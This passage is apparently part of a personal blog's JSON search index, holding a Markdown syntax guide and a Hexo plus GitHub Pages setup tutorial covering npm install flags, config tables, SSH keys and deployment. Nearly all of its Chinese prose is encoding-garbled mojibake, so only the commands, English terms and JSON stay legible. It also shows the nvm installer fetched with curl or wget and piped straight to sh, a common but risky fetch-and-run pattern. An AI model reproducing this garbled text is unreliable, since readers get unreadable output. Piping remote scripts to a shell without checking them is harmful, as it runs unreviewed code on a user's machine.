$$+å›è½¦ï¼Œæˆ–è€…ç”¨crtl+shift+Mç”Ÿæˆå…¬å¼å—ï¼ˆåœ¨æ®µè½èœå•ä¸­çš„å…¬å¼å—ï¼‰\nå‚è€ƒhttps://blog.csdn.net/mingzhuo_126/article/details/82722455\n è„šæ³¨ 1 2  Markdown[^1] [^1]: Markdownæ˜¯ä¸€ç§çº¯æ–‡æœ¬æ ‡è®°è¯­è¨€ // åœ¨æ–‡ç« æœ€åé¢æ˜¾ç¤ºè„šæ³¨   Markdown1\n é”šç‚¹ æ³¨ï¼šåªæœ‰æ ‡é¢˜æ”¯æŒé”šç‚¹ï¼Œ è·³è½¬ç›®å½•æ–¹æ‹¬å·å ä¿æŒç©ºæ ¼\n1 2 3  [å…¬å¼æ ‡é¢˜é”šç‚¹](#1) ### [éœ€è¦è·³è½¬çš„ç›®å½•] {#1} // æ–¹æ‹¬å·åä¿æŒç©ºæ ¼   è„šæ³¨æ ‡é¢˜é”šç‚¹\n1 2 3  ç”±äº{# æ˜¯hexoçš„æ ‡æ³¨è¯­è¨€ hexo ä¸­ {# å±äºä¿ç•™å­—æ®µ {# ... #}å±äºæ³¨é‡Šå­—æ®µ æŠŠ```ä»¥å¤–çš„{#æ”¹æˆ{{ '{#' }}å³å¯è§£å†³    è‡ªåŠ¨é‚®ç®±é“¾æ¥ 1  \u003cxxx@outlook.com\u003e   xxx@outlook.com\n æ—¶åºå›¾ ä»£ç 1\nâ€‹```sequence A-\u003e\u003eB: ä½ å¥½ Note left of A: æˆ‘åœ¨å·¦è¾¹ // æ³¨é‡Šæ–¹å‘ï¼Œåªæœ‰å·¦å³ï¼Œæ²¡æœ‰ä¸Šä¸‹ Note right of B: æˆ‘åœ¨å³è¾¹ B--\u003eA: å¾ˆé«˜å…´è®¤è¯†ä½  â€‹``` æ¼”ç¤º\nä»£ç è¯¦è§£\næ³¨ï¼šA-\u003e\u003eB: ä½ å¥½ åé¢å¯ä»¥ä¸å†™æ–‡å­—ï¼Œä½†æ˜¯ä¸€å®šè¦åœ¨æœ€ååŠ ä¸Šï¼š Note left of A ä»£è¡¨æ³¨é‡Šåœ¨Açš„å·¦è¾¹\n   ç¬¦å· å«ä¹‰     - å®çº¿   \u003e å®å¿ƒç®­å¤´   -- è™šçº¿   \u003e\u003e ç©ºå¿ƒç®­å¤´    ä»£ç 2\n ```sequence èµ·åºŠ-\u003eåƒé¥­: ç¨€é¥­æ²¹æ¡ åƒé¥­-\u003eä¸Šç­: ä¸è¦è¿Ÿåˆ°äº† ä¸Šç­-\u003eåˆé¤: åƒæ’‘äº† ä¸Šç­-\u003eä¸‹ç­: Note right of ä¸‹ç­: ä¸‹ç­äº† ä¸‹ç­-\u003eå›å®¶: Note right of å›å®¶: åˆ°å®¶äº† å›å®¶--\u003e\u003eèµ·åºŠ: Note left of èµ·åºŠ: æ–°çš„ä¸€å¤© æ¼”ç¤º\nè½¬ä¹‰å­—ç¬¦ ç”±äºmarkdownè¯­æ³•çš„åŸå› ï¼Œå¯ä»¥ç”¨\\è¿›è¡Œè½¬ä¹‰ã€‚\n  markdownæ˜¯ä¸€ç§çº¯æ–‡æœ¬æ ‡è®°è¯­è¨€ â†©ï¸\n   ","description":"","tags":["markdown"],"title":"Markdown Syntax","uri":"/posts/markdown-syntax/"},{"categories":["tech"],"content":"hexo+gitPagesæ­å»ºä¸ªäººåšå®¢  æœ¬æ–‡å‚è€ƒ\nhexo åšå®¢æ­å»º\nhexoå®˜æ–¹æ–‡æ¡£\nã€æŒç»­æ›´æ–°ã€‘æœ€å…¨Hexoåšå®¢æ­å»º+ä¸»é¢˜ä¼˜åŒ–+æ’ä»¶é…ç½®+å¸¸ç”¨æ“ä½œ+é”™è¯¯åˆ†æ\næ‰‹æŠŠæ‰‹æ•™ä½ æ­å»ºè‡ªå·±çš„ä¸ªäººåšå®¢ï¼ˆå›¾æ–‡æ•™ç¨‹ï¼‰\næ­å»ºç¯‡ --ä½¿ç”¨Github+hexoæ­å»ºä¸ªäººåšå®¢æ•™ç¨‹â€”æ€»ç»“è‡ªå·±çˆ¬è¿‡çš„å‘\nGitHub+Hexo æ­å»ºä¸ªäººç½‘ç«™è¯¦ç»†æ•™ç¨‹\nå²ä¸Šæœ€è¯¦ç»†çš„Hexoåšå®¢æ­å»ºå›¾æ–‡æ•™ç¨‹\nhexoä¼˜åŒ–\nhexoåšå®¢æ”¹è£…å’Œä¸€äº›ç»†èŠ‚ä¼˜åŒ–\nhttps://www.chakid.com/2018/05/26/hexoåšå®¢æ”¹è£…å’Œä¸€äº›ç»†èŠ‚ä¼˜åŒ–\nHexo NexT åšå®¢åå°ç®¡ç†æŒ‡å—\nHexoä¸»é¢˜æ›´æ”¹ä»¥åŠå°åŠŸèƒ½çš„æ·»åŠ \nhexo-NexTä¸»é¢˜é…ç½®\nNexTå®˜æ–¹å±•ç¤º\nNexTå®˜æ–¹ä¸­æ–‡æ–‡æ¡£ReadME\nNexTæºç \nNexTæ–‡æ¡£\nHexoçš„Nextä¸»é¢˜è¯¦ç»†é…ç½®\nhexoçš„nextä¸»é¢˜ä¸ªæ€§åŒ–æ•™ç¨‹:æ‰“é€ ç‚«é…·ç½‘ç«™\nhexoçš„nextä¸»é¢˜ä¸ªæ€§åŒ–æ•™ç¨‹ï¼šæ‰“é€ ç‚«é…·ç½‘ç«™\nã€æŒç»­æ›´æ–°ã€‘hexo nextä¸»é¢˜ä¼˜åŒ–æ‰‹å†Œ\nå¯å‚è€ƒåšå®¢å˜¤\nhttps://guanqr.com/tech/website/hexo-theme-next-customization/\nhttps://biqianhan-zidi.github.io/\nyiliaä¸»é¢˜\nyiliaä¸»é¢˜æºç ï¼ˆGitHubï¼‰\nyiliaä¸»é¢˜å±•ç¤º\nhexo+gitpageä¼˜åŒ–ï¼š\nhttps://blog.lgf.im/2020/speedup-github-page.html\n hexoåšå®¢æ­å»º å®‰è£…å‰æ å®‰è£… Hexo ç›¸å½“ç®€å•ã€‚ç„¶è€Œåœ¨å®‰è£…å‰ï¼Œæ‚¨å¿…é¡»æ£€æŸ¥ç”µè„‘ä¸­æ˜¯å¦å·²å®‰è£…ä¸‹åˆ—åº”ç”¨ç¨‹åºï¼š\n Node.js (Should be at least nodejs 6.9) Git  å¦‚æœæ‚¨çš„ç”µè„‘ä¸­å·²ç»å®‰è£…ä¸Šè¿°å¿…å¤‡ç¨‹åºï¼Œé‚£ä¹ˆæ­å–œæ‚¨ï¼æ¥ä¸‹æ¥åªéœ€è¦ä½¿ç”¨ npm å³å¯å®Œæˆ Hexo çš„å®‰è£…ã€‚\n$ npm install -g hexo-cli å¦‚æœæ‚¨çš„ç”µè„‘ä¸­å°šæœªå®‰è£…æ‰€éœ€è¦çš„ç¨‹åºï¼Œè¯·æ ¹æ®ä»¥ä¸‹å®‰è£…æŒ‡ç¤ºå®Œæˆå®‰è£…ã€‚\nå¦‚æœæ‚¨çš„ç”µè„‘ä¸­å°šæœªå®‰è£…æ‰€éœ€è¦çš„ç¨‹åºï¼Œè¯·æ ¹æ®ä»¥ä¸‹å®‰è£…æŒ‡ç¤ºå®Œæˆå®‰è£…ã€‚\n Mac ç”¨æˆ·\næ‚¨åœ¨ç¼–è¯‘æ—¶å¯èƒ½ä¼šé‡åˆ°é—®é¢˜ï¼Œè¯·å…ˆåˆ° App Store å®‰è£… Xcodeï¼ŒXcode å®Œæˆåï¼Œå¯åŠ¨å¹¶è¿›å…¥ Preferences -\u003e Download -\u003e Command Line Tools -\u003e Install å®‰è£…å‘½ä»¤è¡Œå·¥å…·ã€‚\n å®‰è£… Git   Windowsï¼šä¸‹è½½å¹¶å®‰è£… git.\n  Macï¼šä½¿ç”¨ Homebrew, MacPorts ï¼šbrew install git;æˆ–ä¸‹è½½ å®‰è£…ç¨‹åº å®‰è£…ã€‚\n  Linux (Ubuntu, Debian)ï¼šsudo apt-get install git-core\n   Linux (Fedora, Red Hat, CentOS)ï¼šsudo yum install git-core\n   Windows ç”¨æˆ·\nç”±äºä¼—æ‰€å‘¨çŸ¥çš„åŸå› ï¼Œä»ä¸Šé¢çš„é“¾æ¥ä¸‹è½½git for windowsæœ€å¥½æŒ‚ä¸Šä¸€ä¸ªä»£ç†ï¼Œå¦åˆ™ä¸‹è½½é€Ÿåº¦ååˆ†ç¼“æ…¢ã€‚ä¹Ÿå¯ä»¥å‚è€ƒè¿™ä¸ªé¡µé¢ï¼Œæ”¶å½•äº†å­˜å‚¨äºç™¾åº¦äº‘çš„ä¸‹è½½åœ°å€ã€‚\n å®‰è£… Node.js å®‰è£… Node.js çš„æœ€ä½³æ–¹å¼æ˜¯ä½¿ç”¨ nvmã€‚\ncURL:\n$ curl https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh Wget:\n$ wget -qO- https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh å®‰è£…å®Œæˆåï¼Œé‡å¯ç»ˆç«¯å¹¶æ‰§è¡Œä¸‹åˆ—å‘½ä»¤å³å¯å®‰è£… Node.jsã€‚\n$ nvm install stable æˆ–è€…æ‚¨ä¹Ÿå¯ä»¥ä¸‹è½½ å®‰è£…ç¨‹åº æ¥å®‰è£…ã€‚\n Windows ç”¨æˆ·\nå¯¹äºwindowsç”¨æˆ·æ¥è¯´ï¼Œå»ºè®®ä½¿ç”¨å®‰è£…ç¨‹åºè¿›è¡Œå®‰è£…ã€‚å®‰è£…æ—¶ï¼Œè¯·å‹¾é€‰Add to PATHé€‰é¡¹ã€‚ å¦å¤–ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨Git Bashï¼Œè¿™æ˜¯git for windowsè‡ªå¸¦çš„ä¸€ç»„ç¨‹åºï¼Œæä¾›äº†Linuxé£æ ¼çš„shellï¼Œåœ¨è¯¥ç¯å¢ƒä¸‹ï¼Œæ‚¨å¯ä»¥ç›´æ¥ç”¨ä¸Šé¢æåˆ°çš„å‘½ä»¤æ¥å®‰è£…Node.jsã€‚æ‰“å¼€å®ƒçš„æ–¹æ³•å¾ˆç®€å•ï¼Œåœ¨ä»»æ„ä½ç½®å•å‡»å³é”®ï¼Œé€‰æ‹©â€œGit Bash Hereâ€å³å¯ã€‚ç”±äºHexoçš„å¾ˆå¤šæ“ä½œéƒ½æ¶‰åŠåˆ°å‘½ä»¤è¡Œï¼Œæ‚¨å¯ä»¥è€ƒè™‘å§‹ç»ˆä½¿ç”¨Git Bashæ¥è¿›è¡Œæ“ä½œã€‚\n å®‰è£… Hexo æ‰€æœ‰å¿…å¤‡çš„åº”ç”¨ç¨‹åºå®‰è£…å®Œæˆåï¼Œå³å¯ä½¿ç”¨ npm å®‰è£… Hexoã€‚\n$ npm install -g hexo-cli åœ¨å®‰è£…çš„æ—¶å€™æˆ‘ç”¨çš„æ˜¯npm install hexo --save\nå…³äºnpmå‘½ä»¤ å›é¡¾ npm install å‘½ä»¤ æœ€è¿‘åœ¨å†™Nodeç¨‹åºçš„æ—¶å€™ï¼Œçªç„¶å¯¹ npm install çš„-saveå’Œ-save-dev è¿™ä¸¤ä¸ªå‚æ•°çš„ä½¿ç”¨æ¯”è¾ƒæ··ä¹±ã€‚å…¶å®åšä¸»åœ¨è¿™ä¹‹å‰å¯¹è¿™ä¸¤ä¸ªå‚æ•°çš„ç†è§£ä¹Ÿæ˜¯æ¨¡ç³Šçš„ï¼Œå„ç§æŸ¥èµ„æ–™å’Œå®è·µåå¯¹å®ƒä»¬ä¹‹é—´çš„å¼‚åŒç‚¹ç•¥æœ‰ç†è§£ã€‚é‚å†™ä¸‹è¿™ç¯‡æ–‡ç« é¿å…è‡ªå·±å¿˜è®°ï¼ŒåŒæ—¶ä¹Ÿç»™nodeçŒ¿å‹ä¸€ç‚¹æŒ‡å¼•ã€‚\næˆ‘ä»¬åœ¨ä½¿ç”¨ npm install å®‰è£…æ¨¡å—çš„æ¨¡å—çš„æ—¶å€™ ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨ä¸‹é¢è¿™å‡ ç§å‘½ä»¤å½¢å¼ï¼š\n1 2 3 4  npm install moduleName # å®‰è£…æ¨¡å—åˆ°é¡¹ç›®ç›®å½•ä¸‹` npm install -g moduleName # -g çš„æ„æ€æ˜¯å°†æ¨¡å—å®‰è£…åˆ°å…¨å±€ï¼Œå…·ä½“å®‰è£…åˆ°ç£ç›˜å“ªä¸ªä½ç½®ï¼Œè¦çœ‹ npm config prefix çš„ä½ç½®ã€‚ npm install -save moduleName # -save çš„æ„æ€æ˜¯å°†æ¨¡å—å®‰è£…åˆ°é¡¹ç›®ç›®å½•ä¸‹ï¼Œå¹¶åœ¨packageæ–‡ä»¶çš„dependenciesèŠ‚ç‚¹å†™å…¥ä¾èµ–ã€‚ npm install -save-dev moduleName # -save-dev çš„æ„æ€æ˜¯å°†æ¨¡å—å®‰è£…åˆ°é¡¹ç›®ç›®å½•ä¸‹ï¼Œå¹¶åœ¨packageæ–‡ä»¶çš„devDependenciesèŠ‚ç‚¹å†™å…¥ä¾èµ–ã€‚   é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œåœ¨é¡¹ç›®ä¸­æˆ‘ä»¬åº”è¯¥ä½¿ç”¨å››ä¸ªå‘½ä»¤ä¸­çš„å“ªä¸ªå‘¢ï¼Ÿè¿™ä¸ªå°±è¦è§†æƒ…å†µè€Œå®šäº†ã€‚ä¸‹é¢å¯¹è¿™å››ä¸ªå‘½ä»¤è¿›è¡Œå¯¹æ¯”ï¼Œçœ‹å®Œåä½ å°±ä¸å†è¿™ä¹ˆé—®äº†ã€‚\nnpm install moduleName å‘½ä»¤  å®‰è£…æ¨¡å—åˆ°é¡¹ç›®node_modulesç›®å½•ä¸‹ã€‚ ä¸ä¼šå°†æ¨¡å—ä¾èµ–å†™å…¥devDependenciesæˆ–dependencies èŠ‚ç‚¹ã€‚ è¿è¡Œ npm install åˆå§‹åŒ–é¡¹ç›®æ—¶ä¸ä¼šä¸‹è½½æ¨¡å—ã€‚  npm install -g moduleName å‘½ä»¤  å®‰è£…æ¨¡å—åˆ°å…¨å±€ï¼Œä¸ä¼šåœ¨é¡¹ç›®node_modulesç›®å½•ä¸­ä¿å­˜æ¨¡å—åŒ…ã€‚ ä¸ä¼šå°†æ¨¡å—ä¾èµ–å†™å…¥devDependenciesæˆ–dependencies èŠ‚ç‚¹ã€‚ è¿è¡Œ npm install åˆå§‹åŒ–é¡¹ç›®æ—¶ä¸ä¼šä¸‹è½½æ¨¡å—ã€‚  npm install -save moduleName å‘½ä»¤  å®‰è£…æ¨¡å—åˆ°é¡¹ç›®node_modulesç›®å½•ä¸‹ã€‚ ä¼šå°†æ¨¡å—ä¾èµ–å†™å…¥dependencies èŠ‚ç‚¹ã€‚ è¿è¡Œ npm install åˆå§‹åŒ–é¡¹ç›®æ—¶ï¼Œä¼šå°†æ¨¡å—ä¸‹è½½åˆ°é¡¹ç›®ç›®å½•ä¸‹ã€‚ è¿è¡Œnpm install --productionæˆ–è€…æ³¨æ˜NODE_ENVå˜é‡å€¼ä¸ºproductionæ—¶ï¼Œä¼šè‡ªåŠ¨ä¸‹è½½æ¨¡å—åˆ°node_modulesç›®å½•ä¸­ã€‚  npm install -save-dev moduleName å‘½ä»¤  å®‰è£…æ¨¡å—åˆ°é¡¹ç›®node_modulesç›®å½•ä¸‹ã€‚ ä¼šå°†æ¨¡å—ä¾èµ–å†™å…¥devDependencies èŠ‚ç‚¹ã€‚ è¿è¡Œ npm install åˆå§‹åŒ–é¡¹ç›®æ—¶ï¼Œä¼šå°†æ¨¡å—ä¸‹è½½åˆ°é¡¹ç›®ç›®å½•ä¸‹ã€‚ è¿è¡Œnpm install --productionæˆ–è€…æ³¨æ˜NODE_ENVå˜é‡å€¼ä¸ºproductionæ—¶ï¼Œä¸ä¼šè‡ªåŠ¨ä¸‹è½½æ¨¡å—åˆ°node_modulesç›®å½•ä¸­ã€‚  å»ºç«™ å®‰è£… Hexo å®Œæˆåï¼Œè¯·æ‰§è¡Œä¸‹åˆ—å‘½ä»¤ï¼ŒHexo å°†ä¼šåœ¨æŒ‡å®šæ–‡ä»¶å¤¹ä¸­æ–°å»ºæ‰€éœ€è¦çš„æ–‡ä»¶ã€‚\n\u003cfolder\u003e ä¸ºhexoå®‰è£…ç›®å½•\n$ hexo init \u003cfolder\u003e $ cd \u003cfolder\u003e $ npm install æ–°å»ºå®Œæˆåï¼ŒæŒ‡å®šæ–‡ä»¶å¤¹çš„ç›®å½•å¦‚ä¸‹ï¼š\n. â”œâ”€â”€ _config.yml â”œâ”€â”€ package.json â”œâ”€â”€ scaffolds â”œâ”€â”€ source | â”œâ”€â”€ _drafts | â””â”€â”€ _posts â””â”€â”€ themes _config.yml ç½‘ç«™çš„ é…ç½® ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥åœ¨æ­¤é…ç½®å¤§éƒ¨åˆ†çš„å‚æ•°ã€‚\npackage.json åº”ç”¨ç¨‹åºçš„ä¿¡æ¯ã€‚EJS, Stylus å’Œ Markdown renderer å·²é»˜è®¤å®‰è£…ï¼Œæ‚¨å¯ä»¥è‡ªç”±ç§»é™¤ã€‚\npackage.json{ \"name\": \"hexo-site\", \"version\": \"0.0.0\", \"private\": true, \"hexo\": { \"version\": \"\" }, \"dependencies\": { \"hexo\": \"^3.8.0\", \"hexo-generator-archive\": \"^0.1.5\", \"hexo-generator-category\": \"^0.1.3\", \"hexo-generator-index\": \"^0.2.1\", \"hexo-generator-tag\": \"^0.2.0\", \"hexo-renderer-ejs\": \"^0.3.1\", \"hexo-renderer-stylus\": \"^0.3.3\", \"hexo-renderer-marked\": \"^0.3.2\", \"hexo-server\": \"^0.3.3\" } } scaffolds æ¨¡ç‰ˆ æ–‡ä»¶å¤¹ã€‚å½“æ‚¨æ–°å»ºæ–‡ç« æ—¶ï¼ŒHexo ä¼šæ ¹æ® scaffold æ¥å»ºç«‹æ–‡ä»¶ã€‚\nHexoçš„æ¨¡æ¿æ˜¯æŒ‡åœ¨æ–°å»ºçš„markdownæ–‡ä»¶ä¸­é»˜è®¤å¡«å……çš„å†…å®¹ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨ä¿®æ”¹scaffold/post.mdä¸­çš„Front-matterå†…å®¹ï¼Œé‚£ä¹ˆæ¯æ¬¡æ–°å»ºä¸€ç¯‡æ–‡ç« æ—¶éƒ½ä¼šåŒ…å«è¿™ä¸ªä¿®æ”¹ã€‚\nsource èµ„æºæ–‡ä»¶å¤¹æ˜¯å­˜æ”¾ç”¨æˆ·èµ„æºçš„åœ°æ–¹ã€‚é™¤ _posts æ–‡ä»¶å¤¹ä¹‹å¤–ï¼Œå¼€å¤´å‘½åä¸º _ (ä¸‹åˆ’çº¿)çš„æ–‡ä»¶ / æ–‡ä»¶å¤¹å’Œéšè—çš„æ–‡ä»¶å°†ä¼šè¢«å¿½ç•¥ã€‚Markdown å’Œ HTML æ–‡ä»¶ä¼šè¢«è§£æå¹¶æ”¾åˆ° public æ–‡ä»¶å¤¹ï¼Œè€Œå…¶ä»–æ–‡ä»¶ä¼šè¢«æ‹·è´è¿‡å»ã€‚\nthemes ä¸»é¢˜ æ–‡ä»¶å¤¹ã€‚Hexo ä¼šæ ¹æ®ä¸»é¢˜æ¥ç”Ÿæˆé™æ€é¡µé¢ã€‚\né…ç½® æ‚¨å¯ä»¥åœ¨ _config.yml ä¸­ä¿®æ”¹å¤§éƒ¨åˆ†çš„é…ç½®ã€‚\n ### ç½‘ç«™    å‚æ•° æè¿°     title ç½‘ç«™æ ‡é¢˜   subtitle ç½‘ç«™å‰¯æ ‡é¢˜   description ç½‘ç«™æè¿°   author æ‚¨çš„åå­—   language ç½‘ç«™ä½¿ç”¨çš„è¯­è¨€   timezone ç½‘ç«™æ—¶åŒºã€‚Hexo é»˜è®¤ä½¿ç”¨æ‚¨ç”µè„‘çš„æ—¶åŒºã€‚æ—¶åŒºåˆ—è¡¨ã€‚æ¯”å¦‚è¯´ï¼šAmerica/New_York, Japan, å’Œ UTC ã€‚    å…¶ä¸­ï¼Œdescriptionä¸»è¦ç”¨äºSEOï¼Œå‘Šè¯‰æœç´¢å¼•æ“ä¸€ä¸ªå…³äºæ‚¨ç«™ç‚¹çš„ç®€å•æè¿°ï¼Œé€šå¸¸å»ºè®®åœ¨å…¶ä¸­åŒ…å«æ‚¨ç½‘ç«™çš„å…³é”®è¯ã€‚authorå‚æ•°ç”¨äºä¸»é¢˜æ˜¾ç¤ºæ–‡ç« çš„ä½œè€…ã€‚\nç½‘å€    å‚æ•° æè¿° é»˜è®¤å€¼     url ç½‘å€    root ç½‘ç«™æ ¹ç›®å½•    permalink æ–‡ç« çš„ æ°¸ä¹…é“¾æ¥ æ ¼å¼ :year/:month/:day/:title/   permalink_defaults æ°¸ä¹…é“¾æ¥ä¸­å„éƒ¨åˆ†çš„é»˜è®¤å€¼      ç½‘ç«™å­˜æ”¾åœ¨å­ç›®å½•\nå¦‚æœæ‚¨çš„ç½‘ç«™å­˜æ”¾åœ¨å­ç›®å½•ä¸­ï¼Œä¾‹å¦‚ http://yoursite.com/blogï¼Œåˆ™è¯·å°†æ‚¨çš„ urlè®¾ä¸º http://yoursite.com/blog å¹¶æŠŠ root è®¾ä¸º /blog/ã€‚\n ç›®å½•    å‚æ•° æè¿° é»˜è®¤å€¼     source_dir èµ„æºæ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹ç”¨æ¥å­˜æ”¾å†…å®¹ã€‚ source   public_dir å…¬å…±æ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹ç”¨äºå­˜æ”¾ç”Ÿæˆçš„ç«™ç‚¹æ–‡ä»¶ã€‚ public   tag_dir æ ‡ç­¾æ–‡ä»¶å¤¹ tags   archive_dir å½’æ¡£æ–‡ä»¶å¤¹ archives   category_dir åˆ†ç±»æ–‡ä»¶å¤¹ categories   code_dir Include code æ–‡ä»¶å¤¹ downloads/code   i18n_dir å›½é™…åŒ–ï¼ˆi18nï¼‰æ–‡ä»¶å¤¹ :lang   skip_render è·³è¿‡æŒ‡å®šæ–‡ä»¶çš„æ¸²æŸ“ï¼Œæ‚¨å¯ä½¿ç”¨ glob è¡¨è¾¾å¼æ¥åŒ¹é…è·¯å¾„ã€‚      æç¤º\nå¦‚æœæ‚¨åˆšåˆšå¼€å§‹æ¥è§¦Hexoï¼Œé€šå¸¸æ²¡æœ‰å¿…è¦ä¿®æ”¹è¿™ä¸€éƒ¨åˆ†çš„å€¼ã€‚\n æ–‡ç«     å‚æ•° æè¿° é»˜è®¤å€¼     new_post_name æ–°æ–‡ç« çš„æ–‡ä»¶åç§° :title.md   default_layout é¢„è®¾å¸ƒå±€ post   auto_spacing åœ¨ä¸­æ–‡å’Œè‹±æ–‡ä¹‹é—´åŠ å…¥ç©ºæ ¼ false   titlecase æŠŠæ ‡é¢˜è½¬æ¢ä¸º title case false   external_link åœ¨æ–°æ ‡ç­¾ä¸­æ‰“å¼€é“¾æ¥ true   filename_case æŠŠæ–‡ä»¶åç§°è½¬æ¢ä¸º (1) å°å†™æˆ– (2) å¤§å†™ 0   render_drafts æ˜¾ç¤ºè‰ç¨¿ false   post_asset_folder å¯åŠ¨ Asset æ–‡ä»¶å¤¹ false   relative_link æŠŠé“¾æ¥æ”¹ä¸ºä¸æ ¹ç›®å½•çš„ç›¸å¯¹ä½å€ false   future æ˜¾ç¤ºæœªæ¥çš„æ–‡ç«  true   highlight ä»£ç å—çš„è®¾ç½®      ç›¸å¯¹åœ°å€\né»˜è®¤æƒ…å†µä¸‹ï¼ŒHexoç”Ÿæˆçš„è¶…é“¾æ¥éƒ½æ˜¯ç»å¯¹åœ°å€ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨çš„ç½‘ç«™åŸŸåä¸ºexample.com,æ‚¨æœ‰ä¸€ç¯‡æ–‡ç« åä¸ºhelloï¼Œé‚£ä¹ˆç»å¯¹é“¾æ¥å¯èƒ½åƒè¿™æ ·ï¼šhttp://example.com/hello.htmlï¼Œå®ƒæ˜¯ç»å¯¹äºåŸŸåçš„ã€‚ç›¸å¯¹é“¾æ¥åƒè¿™æ ·ï¼š/hello.htmlï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ— è®ºç”¨ä»€ä¹ˆåŸŸåè®¿é—®è¯¥ç«™ç‚¹ï¼Œéƒ½æ²¡æœ‰å…³ç³»ï¼Œè¿™åœ¨è¿›è¡Œåå‘ä»£ç†æ—¶å¯èƒ½ç”¨åˆ°ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå»ºè®®ä½¿ç”¨ç»å¯¹åœ°å€ã€‚\n åˆ†ç±» \u0026 æ ‡ç­¾    å‚æ•° æè¿° é»˜è®¤å€¼     default_category é»˜è®¤åˆ†ç±» uncategorized   category_map åˆ†ç±»åˆ«å    tag_map æ ‡ç­¾åˆ«å     æ—¥æœŸ / æ—¶é—´æ ¼å¼ Hexo ä½¿ç”¨ Moment.js æ¥è§£æå’Œæ˜¾ç¤ºæ—¶é—´ã€‚\n   å‚æ•° æè¿° é»˜è®¤å€¼     date_format æ—¥æœŸæ ¼å¼ YYYY-MM-DD   time_format æ—¶é—´æ ¼å¼ H:mm:ss    åˆ†é¡µ    å‚æ•° æè¿° é»˜è®¤å€¼     per_page æ¯é¡µæ˜¾ç¤ºçš„æ–‡ç« é‡ (0 = å…³é—­åˆ†é¡µåŠŸèƒ½) 10   pagination_dir åˆ†é¡µç›®å½• page    æ‰©å±•    å‚æ•° æè¿°     theme å½“å‰ä¸»é¢˜åç§°ã€‚å€¼ä¸ºfalseæ—¶ç¦ç”¨ä¸»é¢˜   deploy éƒ¨ç½²éƒ¨åˆ†çš„è®¾ç½®    éƒ¨ç½² å½“æ‰§è¡Œå®Œnpm installä¹‹åå³å¯é€šè¿‡hexo sæˆ–è€…hexo serveé€šè¿‡æœ¬åœ°è®¿é—®hexoåšå®¢ã€‚\næ­¤æ—¶åšå®¢å·²æ­å»ºåœ¨æœ¬åœ°äº†ã€‚\næ–¹æ¡ˆä¸€ï¼šGithubPages   åˆ›å»ºGithubè´¦å·\n  åˆ›å»ºä»“åº“ï¼Œ ä»“åº“åä¸ºï¼š\u003cGithubè´¦å·åç§°\u003e.github.io\n  å°†æœ¬åœ°Hexoåšå®¢æ¨é€åˆ°GithubPages\n3.1. å®‰è£…hexo-deployer-gitæ’ä»¶ã€‚åœ¨å‘½ä»¤è¡Œï¼ˆå³Git Bashï¼‰è¿è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š\n$ npm install hexo-deployer-git --save 3.2. æ·»åŠ SSH keyã€‚\n  åˆ›å»ºä¸€ä¸ª SSH key ã€‚åœ¨å‘½ä»¤è¡Œï¼ˆå³Git Bashï¼‰è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œ å›è½¦ä¸‰ä¸‹å³å¯ï¼š\n$ ssh-keygen -t rsa -C \"é‚®ç®±åœ°å€\"   æ·»åŠ åˆ° githubã€‚ å¤åˆ¶å¯†é’¥æ–‡ä»¶å†…å®¹ï¼ˆè·¯å¾„å½¢å¦‚C:\\Users\\Administrator\\.ssh\\id_rsa.pubï¼‰ï¼Œç²˜è´´åˆ°New SSH Keyå³å¯ã€‚\n  æµ‹è¯•æ˜¯å¦æ·»åŠ æˆåŠŸã€‚åœ¨å‘½ä»¤è¡Œï¼ˆå³Git Bashï¼‰ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œè¿”å›â€œYou've successfully authenticatedâ€å³æˆåŠŸï¼š\n$ ssh -T git@github.com $ yes   3.3. ä¿®æ”¹_config.ymlï¼ˆåœ¨ç«™ç‚¹ç›®å½•ä¸‹ï¼‰ã€‚æ–‡ä»¶æœ«å°¾ä¿®æ”¹ä¸ºï¼š\n# Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: type: git repo: git@github.com:\u003cGithubè´¦å·åç§°\u003e/\u003cGithubè´¦å·åç§°\u003e.github.io.git branch: master æ³¨æ„ï¼šä¸Šé¢ä»“åº“åœ°å€å†™sshåœ°å€ï¼Œä¸å†™httpåœ°å€ã€‚\n3.4. æ¨é€åˆ°GithubPagesã€‚åœ¨å‘½ä»¤è¡Œï¼ˆå³Git Bashï¼‰ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œ è¿”å›INFO Deploy done: gitå³æˆåŠŸæ¨é€ï¼š\n$ hexo g $ hexo d   ç­‰å¾…1åˆ†é’Ÿå·¦å³ï¼Œæµè§ˆå™¨è®¿é—®ç½‘å€ï¼š https://\u003cGithubè´¦å·åç§°\u003e.github.io\n  è‡³æ­¤ï¼Œæ‚¨çš„Hexoåšå®¢å·²ç»æ­å»ºåœ¨GithubPages, åŸŸåä¸ºhttps://\u003cGithubè´¦å·åç§°\u003e.github.ioã€‚\næ–¹æ¡ˆäºŒï¼šGithubPages + åŸŸå åœ¨æ–¹æ¡ˆä¸€çš„åŸºç¡€ä¸Šï¼Œæ·»åŠ è‡ªå®šä¹‰åŸŸåï¼ˆæ‚¨è´­ä¹°çš„åŸŸåï¼‰ã€‚\n  åŸŸåè§£æã€‚\nç±»å‹é€‰æ‹©ä¸º CNAMEï¼›\nä¸»æœºè®°å½•å³åŸŸåå‰ç¼€ï¼Œå¡«å†™ä¸ºwwwï¼›\nè®°å½•å€¼å¡«å†™ä¸ºè‡ªå®šä¹‰åŸŸåï¼›\nè§£æçº¿è·¯ï¼ŒTTL é»˜è®¤å³å¯ã€‚\n  ä»“åº“è®¾ç½®ã€‚\n2.1. 